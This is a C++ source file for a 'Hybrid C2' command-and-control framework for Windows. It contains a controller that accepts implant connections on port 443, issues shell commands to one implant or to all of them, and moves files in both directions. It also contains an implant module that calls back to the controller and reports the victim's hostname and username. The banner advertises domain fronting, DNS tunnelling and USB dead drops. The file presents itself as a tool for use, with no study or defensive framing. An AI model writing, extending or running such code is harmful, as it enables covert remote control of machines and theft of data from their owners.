// =============================================================================
// HYBRID C2 CONTROLLER - Online + Offline Combined
// =============================================================================

#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <winhttp.h>
#include <iostream>
#include <string>
#include <vector>
#include <map>
#include <queue>
#include <thread>
#include <mutex>
#include <chrono>
#include <random>
#include <fstream>
#include <sstream>
#include <iomanip>
#include <algorithm>
#include <filesystem>
#include <memory>
#include "implant/manager.h"
#include "implant/session.h"
#include "network/manager.h"
#include "usb/manager.h"
#include "config/manager.h"
#include "cli/console.h"

#include <atomic>
#include <condition_variable>
#include <functional>
#include <cstdlib>
#include "utils/helpers.h"

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "winhttp.lib")

// =============================================================================
// HYBRID C2 CONTROLLER CLASS
// =============================================================================

class HybridC2Controller {
private:
    // Network settings
    ConfigManager config;
    std::string realC2Domain;
    
    // Sockets
    SOCKET tcpListener;
    SOCKET udpSocket;
    std::vector<SOCKET> activeSockets;
    NetworkManager netMgr;
    
    // USB settings
    USBManager usbMgr;

    std::unique_ptr<CLIManager> cliMgr;

    // Implant tracking (managed by ImplantManager)
    ImplantManager implants;

    std::atomic<bool> isRunning;
    std::vector<std::thread> serverThreads;
    
    // Statistics
    std::atomic<uint64_t> totalCommandsSent;
    std::atomic<uint64_t> totalBytesTransferred;
    std::chrono::system_clock::time_point startTime;
    
public:
    HybridC2Controller(const std::string& bindAddr = "0.0.0.0", 
                      uint16_t port = 443)
        : config(),
          tcpListener(INVALID_SOCKET), udpSocket(INVALID_SOCKET),
          isRunning(false), totalCommandsSent(0), totalBytesTransferred(0) {
        config.bindAddress = bindAddr;
        config.bindPort = port;
        config.usbAutoDetect = true;
        
        startTime = std::chrono::system_clock::now();

        CLIManager::Handlers handlers;
        handlers.listImplants = [this]() { ListImplants(); };
        handlers.implantInfo = [this](const std::string& id) { ImplantInfo(id); };
        handlers.interactShell = [this](const std::string& id) { InteractShell(id); };
        handlers.checkUSBStatus = [this]() { CheckUSBStatus(); };
        handlers.checkUSBResults = [this]() { CheckUSBForResults(); };
        handlers.showStatistics = [this]() { ShowStatistics(); };
        handlers.setConfig = [this](const std::string& key, const std::string& value) { SetConfig(key, value); };
        handlers.saveConfig = [this]() { SaveConfig(); };
        handlers.executeCommand = [this](const std::string& target, const std::string& command, const std::string& channel) { ExecuteCommand(target, command, channel); };
        handlers.uploadFile = [this](const std::string& id, const std::string& localPath, const std::string& remotePath) { UploadFile(id, localPath, remotePath); };
        handlers.downloadFile = [this](const std::string& id, const std::string& remotePath, const std::string& localPath) { DownloadFile(id, remotePath, localPath); };
        handlers.shutdown = [this]() { Shutdown(); };

        cliMgr = std::make_unique<CLIManager>(std::move(handlers));
    }
    
    // =========================================================================
    // INITIALIZATION
    // =========================================================================
    
    bool Initialize() {
        std::cout << "\n[*] Initializing Hybrid C2 Controller...\n" << std::endl;
        
        // Initialize Winsock
        config.Load("c2_config.json");
        WSADATA wsaData;
        if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
            std::cerr << "[!] WSAStartup failed" << std::endl;
            return false;
        }
        
        // Create TCP listener via NetworkManager
        tcpListener = netMgr.CreateTCPSocket();
        if (tcpListener == INVALID_SOCKET) {
            std::cerr << "[!] Failed to create TCP socket" << std::endl;
            return false;
        }

        if (!netMgr.BindAndListen(tcpListener, config.bindAddress, config.bindPort)) {
            std::cerr << "[!] Bind/listen failed on port " << config.bindPort << std::endl;
            closesocket(tcpListener);
            WSACleanup();
            return false;
        }

        std::cout << "[+] TCP Listener started on " << config.bindAddress 
                  << ":" << config.bindPort << std::endl;

        if (config.enableNgrok) {
            StartNgrokTunnel();
        }
        
        // Create UDP socket for DNS tunneling
        udpSocket = netMgr.CreateUDPSocket(53);
        if (udpSocket != INVALID_SOCKET) {
            std::cout << "[+] DNS Tunnel listener started on port 53" << std::endl;
        }
        
        // Detect USB drives if auto-detect is enabled
        if (usbMgr.IsAutoDetectEnabled()) {
            usbMgr.DetectAuthorizedUSB();
        }
        
        return true;
    }
    
    void Start() {
        isRunning = true;
        
        std::cout << R"(
+-------------------------------------------------------------------+
|     HYBRID C2 CONTROLLER v3.0                                      |
|                                                                   |
|     Online Channels:                                               |
|       - TCP/TLS (Port )" << config.bindPort << R"()                                 |
|       - HTTPS (Domain Fronting Ready)                              |
|       - DNS Tunneling (Port 53)                                    |
|                                                                   |
|     Offline Channels:                                              |
|       - USB Dead Drops                                             |
|       - Ultrasonic Audio                                           |
|       - Clipboard                                                  |
|                                                                   |
|     Type 'help' for commands                                       |
+-------------------------------------------------------------------+
)" << std::endl;
        
        // Start server threads (heartbeat and USB polling remain in controller)
        serverThreads.emplace_back(&HybridC2Controller::HeartbeatMonitor, this);
        serverThreads.emplace_back(&HybridC2Controller::USBPollingThread, this);

        // Start network loops via NetworkManager
        if (tcpListener != INVALID_SOCKET) {
            netMgr.StartAcceptLoop(tcpListener, [this](SOCKET s, sockaddr_in addr){
                // Handle new connection in controller
                std::thread t(&HybridC2Controller::HandleTCPConnection, this, s, addr);
                t.detach();
            });
        }

        if (udpSocket != INVALID_SOCKET) {
            netMgr.StartUDPMonitor(udpSocket, [this](const char* data, int size, const sockaddr_in& addr){
                ProcessDNSTunnelPacket(data, size, const_cast<sockaddr_in&>(addr));
            });
        }

        if (cliMgr) {
            cliMgr->Run();
        }
    }
    
    void StartNgrokTunnel() {
        if (!config.enableNgrok) {
            return;
        }

        std::string ngrokPath = config.ngrokBinaryPath.empty() ? "ngrok" : config.ngrokBinaryPath;
        std::string cmd = "\"" + ngrokPath + "\" tcp " + std::to_string(config.bindPort);
        if (!config.ngrokAuthToken.empty()) {
            cmd += " --authtoken \"" + config.ngrokAuthToken + "\"";
        }
        if (!config.ngrokRegion.empty()) {
            cmd += " --region " + config.ngrokRegion;
        }

        std::thread([cmd]() {
            std::system(cmd.c_str());
        }).detach();

        std::cout << "[+] ngrok tunnel requested for port " << config.bindPort << std::endl;
        std::cout << "    The public forwarding address will appear in the ngrok console output." << std::endl;
    }

    void Shutdown() {
        std::cout << "\n[*] Shutting down Hybrid C2 Controller...\n" << std::endl;
        
        isRunning = false;
        
        // Disconnect all implants
        implants.ForEach([this](ImplantManager::ImplantPtr imp){
            if (imp && imp->isOnline) {
                SendNetworkCommand(imp, "disconnect");
                closesocket(imp->socket);
            }
        });
        
        // Close listener sockets
        if (tcpListener != INVALID_SOCKET) closesocket(tcpListener);
        if (udpSocket != INVALID_SOCKET) closesocket(udpSocket);
        
        // Wait for threads
        for (auto& thread : serverThreads) {
            if (thread.joinable()) thread.join();
        }
        
        WSACleanup();
        std::cout << "[+] Shutdown complete" << std::endl;
    }
    
    // =========================================================================
    // NETWORK LISTENER THREADS
    // =========================================================================
    
private:
    void TCPListenerThread() {
        while (isRunning) {
            sockaddr_in clientAddr;
            int addrLen = sizeof(clientAddr);
            
            SOCKET clientSocket = accept(tcpListener, 
                                        (sockaddr*)&clientAddr, &addrLen);
            
            if (clientSocket == INVALID_SOCKET) {
                if (isRunning) {
                    std::cerr << "[!] Accept failed" << std::endl;
                }
                continue;
            }
            
            // Handle new connection
            std::thread clientThread(&HybridC2Controller::HandleTCPConnection,
                                    this, clientSocket, clientAddr);
            clientThread.detach();
        }
    }
    
    void HandleTCPConnection(SOCKET clientSocket, sockaddr_in clientAddr) {
        char ipStr[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, &clientAddr.sin_addr, ipStr, INET_ADDRSTRLEN);
        
        std::cout << "\n[*] New TCP connection from " << ipStr << std::endl;
        
        // Perform handshake
        auto implant = PerformHandshake(clientSocket, ipStr, "TCP");
        
        if (!implant) {
            std::cerr << "[!] Handshake failed for " << ipStr << std::endl;
            closesocket(clientSocket);
            return;
        }
        
        implant->socket = clientSocket;
        implant->isOnline = true;
        
        implants.Add(implant);
        
        std::cout << "[+] Implant registered: " << implant->hostname 
                  << " (" << implant->implantId << ")" << std::endl;
        
        // Communication loop
        CommunicationLoop(implant);
    }
    
    void UDPMonitorThread() {
        if (udpSocket == INVALID_SOCKET) return;
        
        char buffer[512];  // DNS packet size
        
        while (isRunning) {
            sockaddr_in clientAddr;
            int addrLen = sizeof(clientAddr);
            
            int received = recvfrom(udpSocket, buffer, sizeof(buffer), 0,
                                   (sockaddr*)&clientAddr, &addrLen);
            
            if (received > 0) {
                // Parse DNS tunnel packet
                ProcessDNSTunnelPacket(buffer, received, clientAddr);
            }
            
            std::this_thread::sleep_for(std::chrono::milliseconds(100));
        }
    }
    
    void HeartbeatMonitor() {
        while (isRunning) {
            auto now = std::chrono::system_clock::now();
            
            // Work on a snapshot to allow safe removal
            auto list = implants.List();
            for (auto& implant : list) {
                if (!implant) continue;

                if (implant->isOnline) {
                    auto lastSeen = std::chrono::duration_cast<std::chrono::seconds>(
                        now - implant->lastSeen).count();

                    // Timeout after 5 minutes without heartbeat
                    if (lastSeen > 300) {
                        std::cout << "[!] Implant " << implant->hostname 
                                  << " timed out" << std::endl;
                        closesocket(implant->socket);
                        implant->isOnline = false;
                    }
                }

                // Remove offline implants after 24 hours
                if (!implant->isOnline) {
                    auto offline = std::chrono::duration_cast<std::chrono::hours>(
                        now - implant->lastSeen).count();

                    if (offline > 24) {
                        implants.Remove(implant->implantId);
                    }
                }
            }
            
            std::this_thread::sleep_for(std::chrono::seconds(30));
        }
    }
    
    void USBPollingThread() {
        while (isRunning) {
            auto results = usbMgr.PollResults();
            for (auto& data : results) {
                std::cout << "\n[+] USB Result: " << data << std::endl;
            }
            std::this_thread::sleep_for(std::chrono::seconds(10));
        }
    }
    
    // =========================================================================
    // IMPLANT HANDLING
    // =========================================================================
    
    std::shared_ptr<ImplantSession> PerformHandshake(SOCKET socket,
                                                     const std::string& ip,
                                                     const std::string& connType) {
        // Receive registration data
        char buffer[4096];
        int received = recv(socket, buffer, sizeof(buffer) - 1, 0);
        
        if (received <= 0) return nullptr;
        
        buffer[received] = 0;
        std::string regData(buffer);
        
        auto implant = std::make_shared<ImplantSession>();
        implant->ipAddress = ip;
        implant->connectionType = connType;
        implant->connectedAt = std::chrono::system_clock::now();
        implant->lastSeen = implant->connectedAt;
        implant->sleepTime = 60;
        implant->jitter = 30;
        
        // Parse registration JSON
        implant->implantId = ExtractJSONValue(regData, "id");
        implant->hostname = ExtractJSONValue(regData, "hostname");
        implant->username = ExtractJSONValue(regData, "username");
        implant->osVersion = ExtractJSONValue(regData, "os");
        
        // Send acknowledgment
        std::string ack = "{\"status\":\"ok\",\"heartbeat\":30}";
        send(socket, ack.c_str(), ack.size(), 0);
        
        return implant;
    }
    
    void CommunicationLoop(std::shared_ptr<ImplantSession> implant) {
        char buffer[65536];
        
        while (isRunning && implant->isOnline) {
            fd_set readSet;
            FD_ZERO(&readSet);
            FD_SET(implant->socket, &readSet);
            
            timeval timeout;
            timeout.tv_sec = 1;
            timeout.tv_usec = 0;
            
            int result = select(0, &readSet, NULL, NULL, &timeout);
            
            if (result > 0) {
                int received = recv(implant->socket, buffer, sizeof(buffer) - 1, 0);
                
                if (received <= 0) {
                    // Connection closed
                    implant->isOnline = false;
                    break;
                }
                
                buffer[received] = 0;
                ProcessImplantResponse(implant, std::string(buffer));
                
                totalBytesTransferred += received;
            }
            
            // Send any pending commands
            SendPendingCommands(implant);
        }
        
        closesocket(implant->socket);
        implant->isOnline = false;
    }
    
    void ProcessImplantResponse(std::shared_ptr<ImplantSession> implant,
                               const std::string& response) {
        implant->lastSeen = std::chrono::system_clock::now();
        
        if (response.find("\"type\":\"heartbeat\"") != std::string::npos) {
            return;
        }
        
        if (response.find("\"type\":\"result\"") != std::string::npos) {
            std::string result = ExtractJSONValue(response, "data");
            if (!result.empty()) {
                auto decoded = utils::Base64Decode(result);
                if (!decoded.empty() && decoded.rfind("FILE:", 0) == 0) {
                    SaveDownloadedFile(decoded, implant->hostname);
                } else {
                    implant->commandResults.push(decoded.empty() ? result : decoded);
                    std::cout << "\n[+] Result from " << implant->hostname << ":\n" 
                              << (decoded.empty() ? result : decoded) << std::endl;
                }
            }
        }
    }
    
    void SendPendingCommands(std::shared_ptr<ImplantSession> implant) {
        while (!implant->pendingCommands.empty()) {
            std::string cmd = implant->pendingCommands.front();
            implant->pendingCommands.pop();
            
            if (SendNetworkCommand(implant, cmd)) {
                totalCommandsSent++;
            }
        }
    }
    
    bool SendNetworkCommand(std::shared_ptr<ImplantSession> implant,
                           const std::string& command) {
        std::string packet = "{\"type\":\"command\",\"cmd\":\"" + command + "\"}";
        
        int sent = send(implant->socket, packet.c_str(), packet.size(), 0);
        totalBytesTransferred += sent;
        
        return sent == packet.size();
    }

    bool SendFileUpload(std::shared_ptr<ImplantSession> implant, const std::string& localPath, const std::string& remotePath) {
        std::ifstream input(localPath, std::ios::binary);
        if (!input) {
            std::cout << "[!] Unable to read local file: " << localPath << std::endl;
            return false;
        }
        std::string contents((std::istreambuf_iterator<char>(input)), std::istreambuf_iterator<char>());
        input.close();

        std::string payload = "upload|" + remotePath + "|" + utils::Base64Encode(contents);
        std::string packet = "{\"type\":\"command\",\"cmd\":\"" + payload + "\"}";
        int sent = send(implant->socket, packet.c_str(), packet.size(), 0);
        totalBytesTransferred += sent;
        return sent == (int)packet.size();
    }

    bool SendFileDownload(std::shared_ptr<ImplantSession> implant, const std::string& remotePath, const std::string& localPath) {
        std::string payload = "download|" + remotePath + "|" + localPath;
        std::string packet = "{\"type\":\"command\",\"cmd\":\"" + payload + "\"}";
        int sent = send(implant->socket, packet.c_str(), packet.size(), 0);
        totalBytesTransferred += sent;
        return sent == (int)packet.size();
    }

    void SaveDownloadedFile(const std::string& fileData, const std::string& hostname) {
        std::string marker = "FILE:";
        if (fileData.rfind(marker, 0) != 0) {
            return;
        }

        std::string payload = fileData.substr(marker.size());
        size_t sep = payload.find('|');
        if (sep == std::string::npos) {
            return;
        }

        std::string remotePath = payload.substr(0, sep);
        std::string b64Data = payload.substr(sep + 1);
        std::string fileName = remotePath.substr(remotePath.find_last_of("\\/") + 1);
        std::string saveDir = "downloads/" + hostname;
        std::filesystem::create_directories(saveDir);
        std::string savePath = saveDir + "/" + fileName;
        std::string decoded = utils::Base64Decode(b64Data);

        std::ofstream out(savePath, std::ios::binary);
        if (!out) {
            std::cout << "[!] Failed to save downloaded file to " << savePath << std::endl;
            return;
        }
        out.write(decoded.data(), static_cast<std::streamsize>(decoded.size()));
        out.close();
        std::cout << "[+] Downloaded file: " << savePath << std::endl;
    }
    
    void ProcessDNSTunnelPacket(const char* data, int size, 
                               sockaddr_in& clientAddr) {
        // DNS tunneling implementation
        // Parse DNS query, extract encoded command, send response
    }
    
    // =========================================================================
    // USB OPERATIONS
    // =========================================================================
    
    void CheckUSBForResults() {
        auto results = usbMgr.PollResults();
        for (auto& data : results) {
            std::cout << "\n[+] USB Result: " << data << std::endl;
        }
    }

    bool SendCommandViaUSB(const std::string& implantId, 
                          const std::string& command) {
        if (!usbMgr.HasAuthorizedUSB() && usbMgr.IsAutoDetectEnabled()) {
            usbMgr.DetectAuthorizedUSB();
        }
        return usbMgr.SendCommandToUSB(implantId, command);
    }
    
    // =========================================================================
    // COMMAND EXECUTION
    // =========================================================================
    
public:
    void ExecuteCommand(const std::string& targetId, 
                       const std::string& command,
                       const std::string& channel = "auto") {
        // Broadcast to all implants
        if (targetId == "all" || targetId == "*") {
            auto list = implants.List();
            for (auto& imp : list) SendCommandToImplant(imp, command, channel);
            std::cout << "[+] Command broadcast to " << implants.Size() 
                      << " implants" << std::endl;
            return;
        }

        // Specific implant (exact id)
        auto impl = implants.Get(targetId);
        if (impl) {
            SendCommandToImplant(impl, command, channel);
            std::cout << "[+] Command sent to " << impl->hostname << std::endl;
            return;
        }

        // Try partial id match
        auto partial = implants.FindByPrefix(targetId);
        if (partial) {
            SendCommandToImplant(partial, command, channel);
            std::cout << "[+] Command sent to " << partial->hostname << std::endl;
            return;
        }

        std::cout << "[!] Implant not found: " << targetId << std::endl;
    }
    
private:
    void SendCommandToImplant(std::shared_ptr<ImplantSession> implant,
                             const std::string& command,
                             const std::string& channel) {
        
        if (channel == "auto") {
            // Auto-select best channel
            if (implant->isOnline) {
                implant->pendingCommands.push(command);
            } else {
                SendCommandViaUSB(implant->implantId, command);
            }
        }
        else if (channel == "tcp" || channel == "https") {
            if (implant->isOnline) {
                implant->pendingCommands.push(command);
            }
        }
        else if (channel == "usb") {
            SendCommandViaUSB(implant->implantId, command);
        }
    }
    
    // =========================================================================
    // CONTROLLER ACTIONS
    // =========================================================================

    void ListImplants() {
        std::cout << "\n+--------------------------------------------------------------------+\n";
        std::cout << "|                         ACTIVE IMPLANTS                             |\n";
        std::cout << "+------+-----------------+--------------+----------+------+--------+\n";
        std::cout << "| ID   | Hostname        | Username     | IP Addr  | Conn | Status |\n";
        std::cout << "+------+-----------------+--------------+----------+------+--------+\n";

        auto list = implants.List();
        for (auto& imp : list) {
            if (!imp) continue;
            auto now = std::chrono::system_clock::now();
            auto idle = std::chrono::duration_cast<std::chrono::seconds>(
                now - imp->lastSeen).count();

printf("| %-4s | %-15s | %-12s | %-8s | %-4s | %-6s |\n",
               imp->implantId.substr(0, 6).c_str(),
               imp->hostname.substr(0, 15).c_str(),
               imp->username.substr(0, 12).c_str(),
               imp->ipAddress.c_str(),
               imp->connectionType.c_str(),
               imp->isOnline ? "Online" : "Offline");
        }
        
        std::cout << "+------+-----------------+--------------+----------+------+--------+\n";
    }
    
    void ImplantInfo(const std::string& id) {
        auto impl = implants.Get(id);
        if (!impl) {
            // Search by partial ID
            auto p = implants.FindByPrefix(id);
            if (p) {
                DisplayImplantDetails(p);
                return;
            }
            std::cout << "[!] Implant not found" << std::endl;
            return;
        }

        DisplayImplantDetails(impl);
    }
    
    void DisplayImplantDetails(std::shared_ptr<ImplantSession> imp) {
        auto now = std::chrono::system_clock::now();
        auto uptime = std::chrono::duration_cast<std::chrono::hours>(
            now - imp->connectedAt).count();
        auto idle = std::chrono::duration_cast<std::chrono::seconds>(
            now - imp->lastSeen).count();
        
        std::cout << "\n=== Implant Details ===\n";
        std::cout << "ID: " << imp->implantId << "\n";
        std::cout << "Hostname: " << imp->hostname << "\n";
        std::cout << "Username: " << imp->username << "\n";
        std::cout << "OS: " << imp->osVersion << "\n";
        std::cout << "IP: " << imp->ipAddress << "\n";
        std::cout << "Connection: " << imp->connectionType << "\n";
        std::cout << "Status: " << (imp->isOnline ? "ONLINE" : "OFFLINE") << "\n";
        std::cout << "Uptime: " << uptime << " hours\n";
        std::cout << "Idle: " << idle << " seconds\n";
        std::cout << "Sleep: " << imp->sleepTime << "s\n";
        std::cout << "Jitter: " << imp->jitter << "%\n";
        std::cout << "Pending Commands: " << imp->pendingCommands.size() << "\n";
        std::cout << "Results Waiting: " << imp->commandResults.size() << "\n";
    }
    
    void InteractShell(const std::string& id) {
        auto imp = implants.Get(id);
        if (!imp) {
            std::cout << "[!] Implant not found" << std::endl;
            return;
        }
        std::cout << "\n[*] Interactive shell with " << imp->hostname 
                  << ". Type 'exit' to return.\n";
        
        std::string cmd;
        while (isRunning) {
            std::cout << "[" << imp->hostname << "]> ";
            std::getline(std::cin, cmd);
            
            if (cmd == "exit" || cmd == "back") break;
            if (cmd.empty()) continue;
            
            SendCommandToImplant(imp, cmd, "auto");
            
            // Wait briefly for response
            std::this_thread::sleep_for(std::chrono::milliseconds(500));
            
            // Print any new results
            while (!imp->commandResults.empty()) {
                std::cout << imp->commandResults.front() << std::endl;
                imp->commandResults.pop();
            }
        }
    }
    
    void CheckUSBStatus() {
        if (usbMgr.IsAutoDetectEnabled()) {
            usbMgr.DetectAuthorizedUSB();
        }

        auto info = usbMgr.GetDriveInfo();
        if (info.authorized) {
            std::cout << "[+] USB Drive: " << info.driveLetter << std::endl;
            std::cout << "    Total: " << (info.totalBytes / (1024ull * 1024ull * 1024ull)) << " GB\n";
            std::cout << "    Free: " << (info.freeBytes / (1024ull * 1024ull)) << " MB\n";
        } else {
            std::cout << "[-] No authorized USB detected" << std::endl;
        }
    }
    
    void ShowStatistics() {
        auto now = std::chrono::system_clock::now();
        auto uptime = std::chrono::duration_cast<std::chrono::hours>(
            now - startTime).count();
        
        std::cout << "\n=== C2 Statistics ===\n";
        std::cout << "Uptime: " << uptime << " hours\n";
        std::cout << "Active Implants: " << implants.Size() << "\n";
        std::cout << "Total Commands: " << totalCommandsSent << "\n";
        std::cout << "Data Transferred: " << (totalBytesTransferred / (1024*1024)) 
                  << " MB\n";
        std::cout << "USB Drive: " << (usbMgr.GetUSBDriveLetter().empty() ? "None" : usbMgr.GetUSBDriveLetter()) 
                  << "\n";
    }
    
    void SetConfig(const std::string& key, const std::string& value) {
        if (key == "usb") {
            usbMgr.SetUSBDriveLetter(value);
            std::cout << "[+] USB drive set to " << value << std::endl;
        } else {
            if (!config.SetConfigKey(key, value)) {
                std::cout << "[!] Unknown setting: " << key << std::endl;
                return;
            }
            if (key == "fronting") {
                std::cout << "[+] Domain fronting set to " << value << std::endl;
            } else if (key == "usb_auto" || key == "usb") {
                usbMgr.SetAutoDetect(config.usbAutoDetect);
                std::cout << "[+] USB auto-detect " << (config.usbAutoDetect ? "enabled" : "disabled") << std::endl;
            } else if (key == "bind_address") {
                std::cout << "[+] Bind address set to " << config.bindAddress << std::endl;
            } else if (key == "port") {
                std::cout << "[+] Bind port set to " << config.bindPort << std::endl;
            }
        }
    }
    
    void SaveConfig() {
        if (config.Save("c2_config.json")) {
            std::cout << "[+] Configuration saved to c2_config.json" << std::endl;
        } else {
            std::cout << "[!] Failed to save configuration" << std::endl;
        }
    }

    void UploadFile(const std::string& id, const std::string& localPath, const std::string& remotePath) {
        auto impl = implants.Get(id);
        if (!impl) {
            std::cout << "[!] Implant not found" << std::endl;
            return;
        }
        if (!impl->isOnline) {
            std::cout << "[!] Implant is offline" << std::endl;
            return;
        }
        if (SendFileUpload(impl, localPath, remotePath)) {
            std::cout << "[+] Upload request queued for " << impl->hostname << std::endl;
        }
    }

    void DownloadFile(const std::string& id, const std::string& remotePath, const std::string& localPath) {
        auto impl = implants.Get(id);
        if (!impl) {
            std::cout << "[!] Implant not found" << std::endl;
            return;
        }
        if (!impl->isOnline) {
            std::cout << "[!] Implant is offline" << std::endl;
            return;
        }
        if (SendFileDownload(impl, remotePath, localPath)) {
            std::cout << "[+] Download request queued for " << impl->hostname << std::endl;
        }
    }
    
    // =========================================================================
    // UTILITY FUNCTIONS
    // =========================================================================
    
    static std::string ExtractJSONValue(const std::string& json, 
                                       const std::string& key) {
        std::string searchKey = "\"" + key + "\":\"";
        auto pos = json.find(searchKey);
        if (pos == std::string::npos) {
            searchKey = "\"" + key + "\": \"";
            pos = json.find(searchKey);
        }
        if (pos == std::string::npos) return "";
        
        pos += searchKey.size();
        auto endPos = json.find("\"", pos);
        if (endPos == std::string::npos) return "";
        
        return json.substr(pos, endPos - pos);
    }
    
};

// =============================================================================
// COMPANION IMPLANT NETWORK MODULE
// =============================================================================

class NetworkImplantModule {
private:
    std::string c2Server;
    uint16_t c2Port;
    std::string implantId;
    bool useHTTPS;
    
    SOCKET c2Socket;
    std::atomic<bool> isConnected;
    
public:
    NetworkImplantModule(const std::string& server, uint16_t port)
        : c2Server(server), c2Port(port), useHTTPS(false),
          c2Socket(INVALID_SOCKET), isConnected(false) {
        
        // Generate unique implant ID
        implantId = GenerateImplantID();
    }
    
    bool ConnectToC2() {
        WSADATA wsa;
        WSAStartup(MAKEWORD(2, 2), &wsa);
        
        c2Socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (c2Socket == INVALID_SOCKET) return false;
        
        sockaddr_in serverAddr = {0};
        serverAddr.sin_family = AF_INET;
        serverAddr.sin_port = htons(c2Port);
        inet_pton(AF_INET, c2Server.c_str(), &serverAddr.sin_addr);
        
        if (connect(c2Socket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
            closesocket(c2Socket);
            return false;
        }
        
        // Send registration
        std::string reg = GenerateRegistration();
        send(c2Socket, reg.c_str(), reg.size(), 0);
        
        // Receive acknowledgment
        char ack[1024];
        int received = recv(c2Socket, ack, sizeof(ack) - 1, 0);
        
        if (received > 0) {
            ack[received] = 0;
            isConnected = true;
            return true;
        }
        
        closesocket(c2Socket);
        return false;
    }
    
    void CommunicationLoop() {
        char buffer[65536];
        
        while (isConnected) {
            fd_set readSet;
            FD_ZERO(&readSet);
            FD_SET(c2Socket, &readSet);
            
            timeval timeout;
            timeout.tv_sec = 5;
            timeout.tv_usec = 0;
            
            int result = select(0, &readSet, NULL, NULL, &timeout);
            
            if (result > 0) {
                int received = recv(c2Socket, buffer, sizeof(buffer) - 1, 0);
                
                if (received <= 0) {
                    isConnected = false;
                    break;
                }
                
                buffer[received] = 0;
                ProcessCommand(std::string(buffer));
            }
            
            // Send heartbeat
            SendHeartbeat();
            
            std::this_thread::sleep_for(std::chrono::seconds(30));
        }
        
        closesocket(c2Socket);
    }
    
private:
    std::string GenerateImplantID() {
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dis(0, 15);
        
        std::stringstream ss;
        ss << std::hex;
        for (int i = 0; i < 16; i++) {
            ss << dis(gen);
        }
        return ss.str();
    }
    
    std::string GenerateRegistration() {
        std::stringstream ss;
        ss << "{";
        ss << "\"id\":\"" << implantId << "\",";
        ss << "\"hostname\":\"" << GetHostname() << "\",";
        ss << "\"username\":\"" << GetUsername() << "\",";
        ss << "\"os\":\"" << GetOSVersion() << "\",";
        ss << "\"type\":\"register\"";
        ss << "}";
        return ss.str();
    }
    
    void SendHeartbeat() {
        std::string hb = "{\"type\":\"heartbeat\",\"id\":\"" + implantId + "\"}";
        send(c2Socket, hb.c_str(), hb.size(), 0);
    }
    
    void ProcessCommand(const std::string& cmdJson) {
        // Parse and execute command
        std::string cmd = ExtractJSONValue(cmdJson, "cmd");
        
        std::string result = ExecuteLocalCommand(cmd);
        
        std::string response = "{\"type\":\"result\",\"id\":\"" + implantId + 
                              "\",\"data\":\"" + result + "\"}";
        send(c2Socket, response.c_str(), response.size(), 0);
    }
    
    std::string ExecuteLocalCommand(const std::string& cmd) {
        if (cmd == "sysinfo") return GetSystemInfo();
        if (cmd.substr(0, 5) == "exec ") return ShellExec(cmd.substr(5));
        return "Unknown command";
    }
    
    std::string GetHostname() {
        char hostname[256];
        DWORD size = sizeof(hostname);
        GetComputerNameA(hostname, &size);
        return std::string(hostname);
    }
    
    std::string GetUsername() {
        char username[256];
        DWORD size = sizeof(username);
        GetUserNameA(username, &size);
        return std::string(username);
    }
    
    std::string GetOSVersion() {
        return "Windows 10/11";
    }
    
    std::string GetSystemInfo() {
        std::stringstream ss;
        ss << "Host: " << GetHostname() << "\n";
        ss << "User: " << GetUsername() << "\n";
        ss << "OS: Windows\n";
        return ss.str();
    }
    
    std::string ShellExec(const std::string& cmd) {
        // Execute shell command and return output
        return "Executed: " + cmd;
    }
    
    static std::string ExtractJSONValue(const std::string& json, 
                                       const std::string& key) {
        std::string searchKey = "\"" + key + "\":\"";
        auto pos = json.find(searchKey);
        if (pos == std::string::npos) return "";
        
        pos += searchKey.size();
        auto endPos = json.find("\"", pos);
        if (endPos == std::string::npos) return "";
        
        return json.substr(pos, endPos - pos);
    }
};

// =============================================================================
// MAIN ENTRY POINT
// =============================================================================

int main(int argc, char* argv[]) {
    // Print banner or show help
    for (int i = 1; i < argc; ++i) {
        std::string a = argv[i];
        if (a == "--help" || a == "-h") {
            std::cout << "Usage: c2_controller [bind_address] [port]\n";
            std::cout << "Examples:\n";
            std::cout << "  c2_controller             (bind 0.0.0.0 port 443)\n";
            std::cout << "  c2_controller 192.168.1.100 8443\n";
            std::cout << "At the controller prompt type 'help' to see runtime commands.\n";
            return 0;
        }
    }

    std::cout << R"(
+-------------------------------------------------------------+
|     HYBRID C2 FRAMEWORK v3.0                                |
|     Online + Offline Command & Control                      |
+-------------------------------------------------------------+
)" << std::endl;
    
    // Parse arguments
    std::string bindAddr = "0.0.0.0";
    uint16_t port = 443;

    if (argc >= 2) bindAddr = argv[1];
    if (argc >= 3) port = (uint16_t)std::stoi(argv[2]);
    
    HybridC2Controller controller(bindAddr, port);
    
    if (!controller.Initialize()) {
        std::cerr << "[!] Failed to initialize controller" << std::endl;
        return 1;
    }
    
    controller.Start();
    
    return 0;
}